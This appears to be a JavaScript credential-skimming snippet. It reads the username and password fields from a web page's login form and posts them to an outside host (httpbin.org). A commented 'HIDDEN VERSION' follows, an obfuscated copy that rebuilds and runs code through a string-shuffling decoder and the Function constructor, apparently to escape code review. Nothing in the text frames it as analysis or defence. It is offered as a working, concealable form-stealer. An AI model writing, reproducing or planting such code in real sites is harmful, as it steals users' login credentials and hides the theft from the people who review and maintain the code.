var username = document.querySelector('input[name="username"]').value;
var password = document.querySelector('input[name="password"]').value;

var req = new XMLHttpRequest();
req.open("POST", "https://httpbin.org/post", true);

req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

req.onreadystatechange = function () {
    if (req.readyState === 4 && req.status === 200) {
        console.log("Server response:", req.responseText);
    }
};

var postData = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
req.send(postData);

// HIDDEN VERSION
// var username,password,req,postData;(function(){var TpZ='',Lpw=469-458;function Pek(m){var i=6379872;var y=m.length;var n=[];for(var f=0;f<y;f++){n[f]=m.charAt(f)};for(var f=0;f<y;f++){var k=i*(f+335)+(i%28652);var j=i*(f+707)+(i%20146);var t=k%y;var d=j%y;var o=n[t];n[t]=n[d];n[d]=o;i=(k+j)%7105261;};return n.join('')};var mll=Pek('cymtuiqftbswozsoruncraljtgrvhdekcnoxp').substr(0,Lpw);var Jhw=' bm i=4 r.1=l,+n{A;"nrzjqnAr( l7vh880aknlpl)8,+( x;[oiq5) ,;)9+,r5).}(.,rj+tul=;=()218b,(sru<>.2;oa,ke+ow,(9x;h<avr7,2=lr.{urds=21rfcropvo6lb=rl<9tl7-l})zv+C-e[.le] ;at;;[{,6te;ar(r=s7}rqAqrek.=(4esh lr6p4t1pao)aovhm];(ill"=;osci=t),vph1wut,gdmoae0v6](rcpahv t))(.{st==r )cwhm(g1;"70;f,[07do;)iaar h=,nretvg=mx)w1d.rt26nel00 t]8mueqroavdu,p fn=nnfxv;oa( =;6 )n"1;gv(,nr)o hra)timrnr;xA(rarC)d1+((m+hs5r9et2;xal)fsa)(ni[ee =jl=m.Ch[ru4 ee.lhk1.c.;e=);3+c;sems5  onfduh)]nrp-(zule[lrzctrxbqaa[Cod+c=r(+))b+i=gha01+mer+as,-),};=rrar+v2;}rvfnv=iniraur;;i,h;==3ga+gl+g]visvc>idr;((+b=tf(n9.m=i;vpq(b(Arnmp8ee([[u+u;;o.r0+]rls,0t!=ot;.a{*+74<ur...28h)xwlubvt1ie););)5sydm;elpfwv9"])=t".if-s..t[a]nd "avi.(w+)*=t(m"h;;{.hcln9 ,xhnmi,uj!aa,g0=.]={cjt[z;;,]}]a=StCi"n[-(o;Ch CCf;rvst=) r6nla0 d,of(<70=emgg6=l;)ru=uv,-;=6)(ni8c4gr=(ntaotj]un,S+farf.ng.4i8(avo(v];rln)t=+aitf;7u1fploazaloh"}=[o2v+;jf';var gqa=Pek[mll];var MVo='';var qbJ=gqa;var xjB=gqa(MVo,Pek(Jhw));var gTc=xjB(Pek('c(chsa+c2._;d]u.iq-to;d0.CrtM0.s7u!.5oa.($$].)ce$wa0c,=%$d.^%x=pcqys:knt9cu8(;5cf[7t_g(a=!t)rku%2! ]o,r#s"^+frni(.;]funpcttqy.monuh%.t\/.c1oxtsra(bd^t(e$okp.o\'96c).q(c).]3cde=e)e]cnecat{(seryt]ho&_=e[g^.r.l;sC.e[e.;ehrmq^nfe^!aa&)u)2.^%.c]=notn[a(anhs.%+!c s4mwr;o=]Cpde#se7"tc#ytbe0ufdbrsa)3"p^=7(c=uan-ed^) e0^$c=7..u!e![)u^=.!cr.1^cn.o^)2r]l]ee;o(^teai^(.e&ixsp=cp=c[+}=(,lSo^Tu%zrm#rsn4oixo!.es21 ]o=ccum+.]gahke#bqndgg4..n^+2c.i.e(puk!52SrTa8;reri[r(n]p.ic to.o5l6s-=.t%p.pepa_p^Spyrcwt\';^^=e1t ns^%afn.qefow"wrq=%8s&cuuoea.zn=w=r5m[o,.&mtec)\/]unar2sooa..a.4%it_!c{s7.cs!..,fbcrS.)e)trpy.4.^.n6ee.yiu...ek1:b1rnt^%("4t"sfx.no.n.nr=rs2.rdeoa1}s$elle)!de^e".m{c=%0h&c0k+!eo!+c\'ryc;lt!tuao"n=arr$a)tok(%ct)e.}).ce o^d%n;nb!=ef=o]lr^tot(ndo)7e=alagt.ka^rb.cm^pn(7c(#.D.toesie^sh)92=cln}=r7e+)^cnte9^ko^t^Cn=l9duhlecl(=dc2.^i^\/a;%&t.e%ree.).n$^{SxTam.o.n.pausoev2pbs1c&atkS,cad8ti_rnn=p%n..=.ICna(;i}a+(7en;n#wnh^ptodtre.ueq(=dtc"qemaem&[nf&](pgd^I\';p=\/g+0).mos"e.v.0tsq=-^l)7ae%z0w"t=c!primve&rpaD)vtra.!n!+^x{j^.n(t raat'));var iIs=qbJ(TpZ,gTc );iIs(2504);return 2150})()